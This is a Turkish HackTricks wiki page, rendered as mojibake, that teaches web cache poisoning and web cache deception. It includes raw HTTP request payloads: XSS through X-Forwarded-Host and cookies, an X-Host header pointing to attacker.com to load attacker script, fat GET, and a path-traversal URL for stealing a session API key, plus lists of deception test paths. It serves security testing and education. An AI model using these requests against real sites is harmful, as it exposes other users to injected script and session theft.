# Ã–nbellek Zehirlenmesi ve Ã–nbellek AldatmacasÄ±

<details>

<summary><strong>AWS hackleme konusunda sÄ±fÄ±rdan kahramana kadar Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **KatÄ±lÄ±n** ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na PR gÃ¶ndererek destek olun.

</details>

<figure><img src="../../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kullanarak dÃ¼nyanÄ±n **en geliÅŸmiÅŸ** topluluk araÃ§larÄ± tarafÄ±ndan desteklenen **iÅŸ akÄ±ÅŸlarÄ±nÄ± kolayca oluÅŸturun ve otomatikleÅŸtirin**.\
BugÃ¼n EriÅŸim AlÄ±n:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Fark

> **Web Ã¶nbellek zehirlenmesi ile web Ã¶nbellek aldatmacasÄ± arasÄ±ndaki fark nedir?**
>
> * **Web Ã¶nbellek zehirlenmesinde**, saldÄ±rgan uygulamayÄ± Ã¶nbelleÄŸe bazÄ± kÃ¶tÃ¼ amaÃ§lÄ± iÃ§erikler depolamaya zorlar ve bu iÃ§erik Ã¶nbellekten diÄŸer uygulama kullanÄ±cÄ±larÄ±na sunulur.
> * **Web Ã¶nbellek aldatmacasÄ±nda**, saldÄ±rgan uygulamayÄ± baÅŸka bir kullanÄ±cÄ±ya ait hassas iÃ§erikleri Ã¶nbelleÄŸe depolamaya zorlar ve ardÄ±ndan bu iÃ§eriÄŸi Ã¶nbellekten alÄ±r.

## Ã–nbellek Zehirlenmesi

Ã–nbellek zehirlenmesi, istemci tarafÄ± Ã¶nbelleÄŸini manipÃ¼le etmeyi amaÃ§layarak istemcileri beklenmeyen, kÄ±smi veya saldÄ±rganÄ±n kontrolÃ¼ altÄ±ndaki kaynaklarÄ± yÃ¼klemeye zorlar. Etki derecesi, kirletilmiÅŸ yanÄ±tÄ±n yalnÄ±zca Ã¶nbellek kirliliÄŸi dÃ¶neminde sayfayÄ± ziyaret eden kullanÄ±cÄ±lara sunulmasÄ± nedeniyle etkilenen sayfanÄ±n popÃ¼lerliÄŸine baÄŸlÄ±dÄ±r.

Ã–nbellek zehirlenmesi saldÄ±rÄ±sÄ±nÄ±n gerÃ§ekleÅŸtirilmesi birkaÃ§ adÄ±mÄ± iÃ§erir:

1. **AnahtarsÄ±z GiriÅŸlerin TanÄ±mlanmasÄ±**: Bu, Ã¶nbelleÄŸe alÄ±nmasÄ± iÃ§in gerekli olmasa da sunucu tarafÄ±ndan dÃ¶ndÃ¼rÃ¼len yanÄ±tÄ± deÄŸiÅŸtirebilen parametrelerdir. Bu giriÅŸlerin tanÄ±mlanmasÄ±, Ã¶nbelleÄŸi manipÃ¼le etmek iÃ§in sÃ¶mÃ¼rÃ¼lebileceÄŸi iÃ§in Ã¶nemlidir.
2. **AnahtarsÄ±z GiriÅŸlerin SÃ¶mÃ¼rÃ¼lmesi**: AnahtarsÄ±z giriÅŸleri tanÄ±mladÄ±ktan sonra, bir sonraki adÄ±m bu parametreleri nasÄ±l kÃ¶tÃ¼ye kullanacaÄŸÄ±nÄ±zÄ± belirlemektir, bÃ¶ylece saldÄ±rganÄ±n yararÄ±na sunucunun yanÄ±tÄ±nÄ± deÄŸiÅŸtirebilir.
3. **Zehirli YanÄ±tÄ±n Ã–nbelleÄŸe AlÄ±nmasÄ±nÄ±n SaÄŸlanmasÄ±**: Son adÄ±m, manipÃ¼le edilmiÅŸ yanÄ±tÄ±n Ã¶nbelleÄŸe alÄ±ndÄ±ÄŸÄ±ndan emin olmaktÄ±r. Bu ÅŸekilde, Ã¶nbelleÄŸin zehirlendiÄŸi sÄ±rada etkilenen sayfaya eriÅŸen herhangi bir kullanÄ±cÄ± kirletilmiÅŸ yanÄ±tÄ± alacaktÄ±r.

### KeÅŸif: HTTP baÅŸlÄ±klarÄ±nÄ± kontrol edin

Genellikle bir yanÄ±tÄ±n **Ã¶nbelleÄŸe alÄ±ndÄ±ÄŸÄ±nda buna iÅŸaret eden bir baÅŸlÄ±k** olacaktÄ±r, bu baÅŸlÄ±klara dikkat etmeniz gereken hangi baÅŸlÄ±klar olduÄŸunu bu yazÄ±da kontrol edebilirsiniz: [**HTTP Ã–nbellek baÅŸlÄ±klarÄ±**](../../network-services-pentesting/pentesting-web/special-http-headers.md#cache-headers).

### KeÅŸif: Ã–nbellek hata kodlarÄ±

EÄŸer yanÄ±tÄ±n Ã¶nbelleÄŸe alÄ±ndÄ±ÄŸÄ±nÄ± dÃ¼ÅŸÃ¼nÃ¼yorsanÄ±z, **kÃ¶tÃ¼ bir baÅŸlÄ±kla istek gÃ¶ndermeyi** deneyebilirsiniz, bu durumda bir **durum kodu 400** ile yanÄ±t verilmesi gerekmektedir. Daha sonra isteÄŸi normal olarak eriÅŸmeyi deneyin ve yanÄ±tÄ±n **400 durum kodu** olup olmadÄ±ÄŸÄ±nÄ± kontrol edin, eÄŸer Ã¶yleyse zafiyetli olduÄŸunu bilirsiniz (ve hatta bir DoS gerÃ§ekleÅŸtirebilirsiniz).

Daha fazla seÃ§enek bulabilirsiniz:

{% content-ref url="cache-poisoning-to-dos.md" %}
[cache-poisoning-to-dos.md](cache-poisoning-to-dos.md)
{% endcontent-ref %}

Ancak **bazen bu tÃ¼r durum kodlarÄ± Ã¶nbelleÄŸe alÄ±nmaz** bu nedenle bu test gÃ¼venilir olmayabilir.

### KeÅŸif: AnahtarsÄ±z giriÅŸleri tanÄ±mlayÄ±n ve deÄŸerlendirin

[**Param Miner**](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943) kullanarak sayfanÄ±n yanÄ±tÄ±nÄ± deÄŸiÅŸtirebilecek parametreleri ve baÅŸlÄ±klarÄ± **brute-force** yÃ¶ntemiyle bulabilirsiniz. Ã–rneÄŸin, bir sayfa istemciye betiÄŸi oradan yÃ¼klemesi iÃ§in `X-Forwarded-For` baÅŸlÄ±ÄŸÄ±nÄ± kullanÄ±yor olabilir:
```markup
<script type="text/javascript" src="//<X-Forwarded-For_value>/resources/js/tracking.js"></script>
```
### ZararlÄ± bir yanÄ±tÄ± arka uÃ§ sunucudan Ã§Ä±karÄ±n

Belirlenen parametre/baÅŸlÄ±k ile kontrol edin, nasÄ±l **temizlendiÄŸini** ve nerede yansÄ±tÄ±ldÄ±ÄŸÄ±nÄ± veya yanÄ±tÄ± nasÄ±l etkilediÄŸini kontrol edin. Herhangi bir ÅŸekilde kÃ¶tÃ¼ye kullanabilir misiniz (XSS gerÃ§ekleÅŸtirebilir veya sizin tarafÄ±nÄ±zdan kontrol edilen bir JS kodu yÃ¼kleyebilir misiniz? DoS gerÃ§ekleÅŸtirebilir misiniz?...)

### YanÄ±tÄ± Ã¶nbelleÄŸe alÄ±n

KÃ¶tÃ¼ye kullanÄ±labilecek **sayfayÄ±** belirledikten sonra, hangi **parametre**/**baÅŸlÄ±k**'Ä± kullanacaÄŸÄ±nÄ±zÄ± ve nasÄ±l **kÃ¶tÃ¼ye kullanacaÄŸÄ±nÄ±zÄ±** belirledikten sonra, sayfayÄ± Ã¶nbelleÄŸe almanÄ±z gerekmektedir. Ã–nbelleÄŸe alÄ±nmaya Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ±z kaynaÄŸa baÄŸlÄ± olarak, bu biraz zaman alabilir, birkaÃ§ saniye boyunca denemek zorunda kalabilirsiniz.\
YanÄ±tta **`X-Cache`** baÅŸlÄ±ÄŸÄ±, isteÄŸin Ã¶nbelleÄŸe alÄ±nmadÄ±ÄŸÄ± durumlarda **`miss`** deÄŸerine sahip olabileceÄŸi ve Ã¶nbelleÄŸe alÄ±ndÄ±ÄŸÄ±nda **`hit`** deÄŸerine sahip olabileceÄŸi iÃ§in Ã§ok yararlÄ± olabilir.\
**`Cache-Control`** baÅŸlÄ±ÄŸÄ± da kaynaÄŸÄ±n Ã¶nbelleÄŸe alÄ±nÄ±p alÄ±nmadÄ±ÄŸÄ±nÄ± ve kaynaÄŸÄ±n bir sonraki sefer ne zaman tekrar Ã¶nbelleÄŸe alÄ±nacaÄŸÄ±nÄ± bilmek iÃ§in ilginÃ§tir: `Cache-Control: public, max-age=1800`\
BaÅŸka bir ilginÃ§ baÅŸlÄ±k ise **`Vary`**. Bu baÅŸlÄ±k genellikle Ã¶nbellek anahtarÄ± olarak kullanÄ±lmayan ek baÅŸlÄ±klarÄ± belirtmek iÃ§in kullanÄ±lÄ±r. Bu nedenle, saldÄ±rgan, hedeflediÄŸi kurbanÄ±n `User-Agent`'Ä±nÄ± biliyorsa, o belirli `User-Agent` kullanan kullanÄ±cÄ±lar iÃ§in Ã¶nbelleÄŸi zehirleyebilir.\
Ã–nbellekle ilgili bir baÅŸka baÅŸlÄ±k ise **`Age`**. Bu, nesnenin proxy Ã¶nbelleÄŸinde kaÃ§ saniye boyunca olduÄŸunu tanÄ±mlar.

Bir isteÄŸi Ã¶nbelleÄŸe alÄ±rken, kullandÄ±ÄŸÄ±nÄ±z baÅŸlÄ±klara **dikkat edin** Ã§Ã¼nkÃ¼ bunlardan bazÄ±larÄ± beklenmedik ÅŸekilde **anahtar olarak kullanÄ±labilir** ve **kurbanÄ±n aynÄ± baÅŸlÄ±ÄŸÄ± kullanmasÄ± gerekebilir**. Her zaman **farklÄ± tarayÄ±cÄ±lar** kullanarak bir Ã–nbellek Zehirlenmesini **test edin** ve Ã§alÄ±ÅŸÄ±p Ã§alÄ±ÅŸmadÄ±ÄŸÄ±nÄ± kontrol edin.

## SÃ¶mÃ¼rÃ¼ Ã–rnekleri

### En kolay Ã¶rnek

`X-Forwarded-For` gibi bir baÅŸlÄ±k, yanÄ±tta temizlenmemiÅŸ olarak yansÄ±tÄ±lmaktadÄ±r.\
Temel bir XSS yÃ¼kÃ¼ gÃ¶nderebilir ve Ã¶nbelleÄŸi zehirleyebilirsiniz, bÃ¶ylece sayfaya eriÅŸen herkes XSS'e maruz kalacaktÄ±r:
```markup
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: a."><script>alert(1)</script>"
```
_Not: Bu, `/en` yerine `/en?region=uk` isteÄŸini zehirleyecektir._

### DoS iÃ§in Ã¶nbellek zehirlenmesi

{% content-ref url="cache-poisoning-to-dos.md" %}
[cache-poisoning-to-dos.md](cache-poisoning-to-dos.md)
{% endcontent-ref %}

### Ã‡erez iÅŸleme aÃ§Ä±klarÄ±nÄ± sÃ¶mÃ¼rmek iÃ§in web Ã¶nbellek zehirlenmesi kullanma

Ã‡erezler ayrÄ±ca bir sayfanÄ±n yanÄ±tÄ±nda yansÄ±tÄ±labilir. Ã–rneÄŸin bir XSS oluÅŸturmak iÃ§in bunu kÃ¶tÃ¼ye kullanabilirseniz, kÃ¶tÃ¼ niyetli Ã¶nbellek yanÄ±tÄ±nÄ± yÃ¼kleyen birkaÃ§ istemci Ã¼zerinde XSS'i sÃ¶mÃ¼rebilirsiniz.
```markup
GET / HTTP/1.1
Host: vulnerable.com
Cookie: session=VftzO7ZtiBj5zNLRAuFpXpSQLjS4lBmU; fehost=asd"%2balert(1)%2b"
```
### Yol gezintisi ile Ã¶nbellek yanÄ±ltmasÄ± yaparak API anahtarÄ±nÄ± Ã§almak iÃ§in yol gezintisi ile Ã¶nbellek zehirlenmesi <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

[**Bu yazÄ±da aÃ§Ä±klandÄ±ÄŸÄ± gibi**](https://nokline.github.io/bugbounty/2024/02/04/ChatGPT-ATO.html), `https://chat.openai.com/share/%2F..%2Fapi/auth/session?cachebuster=123` gibi bir URL ile bir OpenAI API anahtarÄ±nÄ±n Ã§alÄ±nabilmesinin mÃ¼mkÃ¼n olduÄŸu Ã§Ã¼nkÃ¼ `/share/*` ile eÅŸleÅŸen her ÅŸey, URL'yi normalize etmeden Ã¶nbelleÄŸe alÄ±nacaktÄ±r. Bu normalleÅŸtirme, istek web sunucusuna ulaÅŸtÄ±ÄŸÄ±nda yapÄ±lmÄ±ÅŸtÄ±r.

### Web Ã¶nbellek zehirlenmesi aÃ§Ä±klarÄ±nÄ± sÃ¶mÃ¼rmek iÃ§in birden fazla baÅŸlÄ±k kullanma <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

Bazen bir Ã¶nbelleÄŸi kÃ¶tÃ¼ye kullanabilmek iÃ§in **birkaÃ§ anahtarsÄ±z giriÅŸi sÃ¶mÃ¼rmeniz gerekebilir**. Ã–rneÄŸin, `X-Forwarded-Host`'u sizin kontrol ettiÄŸiniz bir alan adÄ±na ve `X-Forwarded-Scheme`'i `http` olarak ayarlarsanÄ±z, bir **AÃ§Ä±k yÃ¶nlendirme** bulabilirsiniz. **EÄŸer** **sunucu** tÃ¼m **HTTP** isteklerini **HTTPS'ye yÃ¶nlendiriyorsa** ve yÃ¶nlendirme iÃ§in alan adÄ± olarak `X-Forwarded-Scheme` baÅŸlÄ±ÄŸÄ±nÄ± kullanÄ±yorsa, yÃ¶nlendirmenin nereye yapÄ±ldÄ±ÄŸÄ±nÄ± kontrol edebilirsiniz.
```markup
GET /resources/js/tracking.js HTTP/1.1
Host: acc11fe01f16f89c80556c2b0056002e.web-security-academy.net
X-Forwarded-Host: ac8e1f8f1fb1f8cb80586c1d01d500d3.web-security-academy.net/
X-Forwarded-Scheme: http
```
### SÄ±nÄ±rlÄ± `Vary` baÅŸlÄ±ÄŸÄ± ile SÃ¶mÃ¼rme

EÄŸer yanÄ±tta **`User-Agent`**'Ä± iÅŸaret eden **`Vary`** baÅŸlÄ±ÄŸÄ± kullanÄ±ldÄ±ÄŸÄ±nÄ± fark ederseniz ve **`X-Host`** baÅŸlÄ±ÄŸÄ±nÄ±n bir JS kaynaÄŸÄ±nÄ± yÃ¼klemek iÃ§in **alan adÄ± olarak kullanÄ±ldÄ±ÄŸÄ±nÄ±** bulursanÄ±z, kurbanÄ±n User-Agent'Ä±nÄ± dÄ±ÅŸa aktarmak ve bu kullanÄ±cÄ± ajanÄ±nÄ± kullanarak Ã¶nbelleÄŸi zehirlemek iÃ§in bir yol bulmanÄ±z gerekir:
```markup
GET / HTTP/1.1
Host: vulnerbale.net
User-Agent: THE SPECIAL USER-AGENT OF THE VICTIM
X-Host: attacker.com
```
### Fat Get

GET isteÄŸi, isteÄŸi URL'de ve gÃ¶vdede gÃ¶ndererek gÃ¶nderilir. EÄŸer web sunucusu gÃ¶vdedeki parametreyi kullanÄ±yorsa ancak Ã¶nbellek sunucusu URL'deki parametreyi Ã¶nbelleÄŸe alÄ±yorsa, o URL'ye eriÅŸen herkes aslÄ±nda gÃ¶vdedeki parametreyi kullanacaktÄ±r. Github web sitesinde bulunan James Kettle'Ä±n keÅŸfettiÄŸi zayÄ±flÄ±k gibi.
```
GET /contact/report-abuse?report=albinowax HTTP/1.1
Host: github.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

report=innocent-victim
```
### Parametre Gizleme

Ã–rneÄŸin, ruby sunucularda **parametreleri** **`&`** yerine **`;`** karakterini kullanarak ayÄ±rabilirsiniz. Bu, anahtarlÄ± olmayan parametre deÄŸerlerini anahtarlÄ± olanlarÄ±n iÃ§ine yerleÅŸtirmek ve bunlarÄ± kÃ¶tÃ¼ye kullanmak iÃ§in kullanÄ±labilir.

Portswigger lab: [https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking)

### HTTP Ä°steÄŸi KaÃ§Ä±rarak HTTP Ã–nbellek Zehirlenmesini KÃ¶tÃ¼ye Kullanma

[HTTP Ä°steÄŸi KaÃ§Ä±rarak Web Ã–nbellek Zehirlenmesi](../http-request-smuggling/#using-http-request-smuggling-to-perform-web-cache-poisoning) saldÄ±rÄ±larÄ±nÄ± nasÄ±l gerÃ§ekleÅŸtireceÄŸiniz hakkÄ±nda buradan bilgi edinin.

### Web Ã–nbellek Zehirlenmesi iÃ§in Otomatik Test

[Web Ã–nbellek Zafiyet TarayÄ±cÄ±sÄ±](https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner) web Ã¶nbellek zehirlenmesi iÃ§in otomatik test yapmak iÃ§in kullanÄ±labilir. BirÃ§ok farklÄ± teknikleri destekler ve yÃ¼ksek derecede Ã¶zelleÅŸtirilebilir.

Ã–rnek kullanÄ±m: `wcvs -u example.com`



<figure><img src="../../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kullanarak dÃ¼nyanÄ±n **en geliÅŸmiÅŸ** topluluk araÃ§larÄ± tarafÄ±ndan desteklenen **iÅŸ akÄ±ÅŸlarÄ±nÄ± kolayca oluÅŸturun ve otomatikleÅŸtirin**.\
BugÃ¼n EriÅŸim AlÄ±n:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}



## ZayÄ±f Ã–rnekler

### Apache Traffic Server ([CVE-2021-27577](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-27577))

ATS, URL iÃ§indeki parÃ§ayÄ± ayÄ±klamadan iletmiÅŸ ve Ã¶nbellek anahtarÄ±nÄ± yalnÄ±zca ana bilgisayar, yol ve sorgu kullanarak oluÅŸturmuÅŸtur (parÃ§ayÄ± yok sayarak). Bu nedenle, `/#/../?r=javascript:alert(1)` isteÄŸi arka uca `/#/../?r=javascript:alert(1)` olarak gÃ¶nderilmiÅŸ ve Ã¶nbellek anahtarÄ± iÃ§inde yalnÄ±zca ana bilgisayar, yol ve sorgu bulunmuÅŸtur.

### GitHub CP-DoS

Ä°Ã§erik tÃ¼rÃ¼ baÅŸlÄ±ÄŸÄ±nda kÃ¶tÃ¼ bir deÄŸer gÃ¶ndermek, Ã¶nbelleÄŸe alÄ±nmÄ±ÅŸ bir 405 yanÄ±tÄ±nÄ± tetiklemiÅŸtir. Ã–nbellek anahtarÄ± Ã§erez iÃ§erdiÄŸi iÃ§in yalnÄ±zca kimlik doÄŸrulamasÄ± yapÄ±lmamÄ±ÅŸ kullanÄ±cÄ±lara saldÄ±rÄ± yapmak mÃ¼mkÃ¼n olmuÅŸtur.

### GitLab + GCP CP-DoS

GitLab, statik iÃ§eriÄŸi depolamak iÃ§in GCP kovalarÄ±nÄ± kullanÄ±r. **GCP KovalarÄ±**, **`x-http-method-override`** baÅŸlÄ±ÄŸÄ±nÄ± destekler. Bu nedenle, `x-http-method-override: HEAD` baÅŸlÄ±ÄŸÄ±nÄ± gÃ¶ndermek ve Ã¶nbelleÄŸi boÅŸ bir yanÄ±t gÃ¶vdesi dÃ¶ndÃ¼rmek mÃ¼mkÃ¼n olmuÅŸtur. AyrÄ±ca `PURGE` yÃ¶ntemini de destekleyebilir.

### Rack Ara YazÄ±lÄ±mÄ± (Ruby on Rails)

Ruby on Rails uygulamalarÄ±nda genellikle Rack ara yazÄ±lÄ±mÄ± kullanÄ±lÄ±r. Rack kodunun amacÄ±, **`x-forwarded-scheme`** baÅŸlÄ±ÄŸÄ±nÄ±n deÄŸerini almak ve isteÄŸin ÅŸemasÄ± olarak ayarlamaktÄ±r. `x-forwarded-scheme: http` baÅŸlÄ±ÄŸÄ± gÃ¶nderildiÄŸinde, aynÄ± konuma yÃ¶nlendirilen bir 301 yÃ¶nlendirmesi gerÃ§ekleÅŸir, bu da o kaynaÄŸa karÅŸÄ± bir Hizmet Reddi (DoS) oluÅŸturabilir. AyrÄ±ca, uygulama `X-forwarded-host` baÅŸlÄ±ÄŸÄ±nÄ± kabul edebilir ve kullanÄ±cÄ±larÄ± belirtilen ana bilgisayara yÃ¶nlendirebilir. Bu davranÄ±ÅŸ, saldÄ±rganÄ±n sunucudan JavaScript dosyalarÄ±nÄ± yÃ¼klemesine neden olabilir ve gÃ¼venlik riski oluÅŸturabilir.

### 403 ve Depolama KovalarÄ±

Cloudflare Ã¶nceden 403 yanÄ±tlarÄ±nÄ± Ã¶nbelleÄŸe almÄ±ÅŸtÄ±r. YanlÄ±ÅŸ Yetkilendirme baÅŸlÄ±klarÄ± ile S3 veya Azure Depolama BloklarÄ±na eriÅŸmeye Ã§alÄ±ÅŸmak, Ã¶nbelleÄŸe alÄ±nmÄ±ÅŸ bir 403 yanÄ±tÄ±na neden olmuÅŸtur. Cloudflare 403 yanÄ±tlarÄ±nÄ± Ã¶nbelleÄŸe almaktan vazgeÃ§miÅŸ olsa da, bu davranÄ±ÅŸ diÄŸer proxy hizmetlerinde hala mevcut olabilir.

### AnahtarlÄ± Parametreler Enjekte Etme

Ã–nbellekler genellikle Ã¶zel GET parametrelerini Ã¶nbellek anahtarÄ±nda saklar. Ã–rneÄŸin, Fastly'nin Varnish'i isteklerde `size` parametresini Ã¶nbelleÄŸe almÄ±ÅŸtÄ±r. Ancak, hatalÄ± bir deÄŸerle birlikte URL kodlanmÄ±ÅŸ bir parametre (Ã¶rneÄŸin, `siz%65`) gÃ¶nderildiÄŸinde, Ã¶nbellek anahtarÄ± doÄŸru `size` parametresini kullanarak oluÅŸturulur. Ancak, arka uÃ§ URL kodlanmÄ±ÅŸ parametreyi iÅŸler. Ä°kinci `size` parametresini URL kodlamak, Ã¶nbellek tarafÄ±ndan atlanmasÄ±na ancak arka uÃ§ tarafÄ±ndan kullanÄ±lmasÄ±na neden olmuÅŸtur. Bu parametreye 0 deÄŸeri atamak, Ã¶nbelleÄŸe alÄ±nabilir bir 400 HatalÄ± Ä°stek hatasÄ± sonucunu doÄŸurmuÅŸtur.

### KullanÄ±cÄ± AjanÄ± KurallarÄ±

BazÄ± geliÅŸtiriciler, sunucu yÃ¼kÃ¼nÃ¼ yÃ¶netmek iÃ§in FFUF veya Nuclei gibi yÃ¼ksek trafikli araÃ§larÄ±n kullanÄ±cÄ± ajanlarÄ±yla eÅŸleÅŸen istekleri engeller. Ä°ronik bir ÅŸekilde, bu yaklaÅŸÄ±m Ã¶nbellek zehirlenmesi ve Hizmet Reddi gibi gÃ¼venlik aÃ§Ä±klarÄ±na neden olabilir.

### YasadÄ±ÅŸÄ± BaÅŸlÄ±k AlanlarÄ±

[RFC7230](https://datatracker.ietf.mrg/doc/html/rfc7230), baÅŸlÄ±k adlarÄ±nda kabul edilebilir karakterleri belirtir. Belirtilen **tchar** aralÄ±ÄŸÄ±nÄ±n dÄ±ÅŸÄ±ndaki karakterleri iÃ§eren baÅŸlÄ±klarÄ±n ideal olarak bir 400 HatalÄ± Ä°stek yanÄ±tÄ± tetiklemesi gerekmektedir. Uygulamada sunucular her zaman bu standartlara uymazlar. Akamai gibi, `cache-control` baÅŸlÄ±ÄŸÄ± mevcut olmadÄ±ÄŸÄ± sÃ¼rece geÃ§ersiz karakterler iÃ§eren baÅŸlÄ±klarÄ± iletir ve herhangi bir 400 hatasÄ±nÄ± Ã¶nbelleÄŸe alÄ±r. `\` gibi geÃ§ersiz bir karakter iÃ§eren bir baÅŸlÄ±k gÃ¶ndermenin, Ã¶nbelleÄŸe alÄ±nabilir bir 400 HatalÄ± Ä°stek hatasÄ± sonucunu doÄŸurduÄŸu bir aÃ§Ä±klanabilir model belirlenmiÅŸtir.

### Yeni baÅŸlÄ±klar bulma

[https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6](https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6)

## Ã–nbellek AldatmacasÄ±

Ã–nbellek AldatmacasÄ±nÄ±n amacÄ±, istemcilerin **duyarlÄ± bilgileriyle birlikte Ã¶nbelleÄŸe alÄ±nacak kaynaklarÄ± yÃ¼klemelerini saÄŸlamaktÄ±r**.

Ã–ncelikle **.css**, **.js**, **.png** gibi **uzantÄ±larÄ±n** genellikle **Ã¶nbelleÄŸe alÄ±nacak ÅŸekilde yapÄ±landÄ±rÄ±ldÄ±ÄŸÄ±nÄ±** unutmayÄ±n. Bu nedenle, `www.example.com/profile.php/nonexistent.js`'ye eriÅŸirseniz, Ã¶nbellek muhtemelen yanÄ±tÄ± saklayacaktÄ±r Ã§Ã¼nkÃ¼ **.js** uzantÄ±sÄ±nÄ± gÃ¶rÃ¼r. Ancak, **uygulama** _www.example.com/profile.php/_ iÃ§inde **saklanan duyarlÄ±** kullanÄ±cÄ± iÃ§eriÄŸiyle **yeniden oynuyorsa**, diÄŸer kullanÄ±cÄ±lardan bu iÃ§erikleri **Ã§alabilirsiniz**.

Test edilecek diÄŸer ÅŸeyler:

* _www.example.com/profile.php/.js_
* _www.example.com/profile.php/.css_
* _www.example.com/profile.php/test.js_
* _www.example.com/profile.php/../test.js_
* _www.example.com/profile.php/%2e%2e/test.js_
* _.avif_ gibi daha az bilinen uzantÄ±larÄ± kullanÄ±n

Bu yazÄ±da Ã§ok aÃ§Ä±k bir Ã¶rnek bulunabilir: [https://hackerone.com/reports/593712](https://hackerone.com/reports/593712).\
Ã–rnekte, _http://www.example.com/home.php/non-existent.css_ gibi mevcut olmayan bir sayfa yÃ¼klerseniz, Ã¶nceki eriÅŸen kullanÄ±cÄ±larÄ±n **duyarlÄ± bilgileriyle** _http://www.example.com/home.php/_ iÃ§eriÄŸi geri dÃ¶necek ve Ã¶nbellek sunucusu sonucu kaydedecektir.\
ArdÄ±ndan, **saldÄ±rgan** kendi tarayÄ±cÄ±sÄ±nda _http://www.example.com/home.php/non-existent.css_'e eriÅŸebilir ve Ã¶nceki kullanÄ±cÄ±larÄ±n **gizli bilgilerini** gÃ¶zlemleyebilir.

Ã–nbellek ajanÄ±nÄ±n dosyalarÄ± **iÃ§erik tÃ¼rÃ¼ne** gÃ¶re deÄŸil, dosya uzantÄ±sÄ±na gÃ¶re Ã¶nbelleÄŸe alacak ÅŸekilde **yapÄ±landÄ±rÄ±lmasÄ± gerektiÄŸini** unutmayÄ±n (_.css_). Ã–rnekte _http://www.example.com/home.php/non-existent.css_ bir `text/html` iÃ§erik tÃ¼rÃ¼ne sahip olacak ve bir `text/css` mime tÃ¼rÃ¼ yerine (beklenen _.css_ dosyasÄ± iÃ§in) olacaktÄ±r.

[HTTP Ä°steÄŸi KaÃ§Ä±rarak Web Ã–nbellek AldatmacalarÄ± saldÄ±rÄ±larÄ±nÄ± nasÄ±l gerÃ§ekleÅŸtireceÄŸiniz hakkÄ±nda buradan bilgi edinin](../http-request-smuggling/#using-http-request-smuggling-to-perform-web-cache-deception).
## Otomatik AraÃ§lar

* [**toxicache**](https://github.com/xhzeem/toxicache): Belirli URL'lerde web Ã¶nbellek zehirlenmesi aÃ§Ä±klarÄ±nÄ± bulmak ve birden fazla enjeksiyon tekniÄŸini test etmek iÃ§in Golang tarayÄ±cÄ±.

## Referanslar

* [https://portswigger.net/web-security/web-cache-poisoning](https://portswigger.net/web-security/web-cache-poisoning)
* [https://portswigger.net/web-security/web-cache-poisoning/exploiting#using-web-cache-poisoning-to-exploit-cookie-handling-vulnerabilities](https://portswigger.net/web-security/web-cache-poisoning/exploiting#using-web-cache-poisoning-to-exploit-cookie-handling-vulnerabilities)
* [https://hackerone.com/reports/593712](https://hackerone.com/reports/593712)
* [https://youst.in/posts/cache-poisoning-at-scale/](https://youst.in/posts/cache-poisoning-at-scale/)
* [https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9](https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9)
* [https://www.linkedin.com/pulse/how-i-hacked-all-zendesk-sites-265000-site-one-line-abdalhfaz/](https://www.linkedin.com/pulse/how-i-hacked-all-zendesk-sites-265000-site-one-line-abdalhfaz/)

<figure><img src="../../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks)'i kullanarak dÃ¼nyanÄ±n en geliÅŸmiÅŸ topluluk araÃ§larÄ± tarafÄ±ndan desteklenen **otomatik iÅŸ akÄ±ÅŸlarÄ±** oluÅŸturun ve otomatikleÅŸtirin.\
BugÃ¼n EriÅŸim AlÄ±n:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

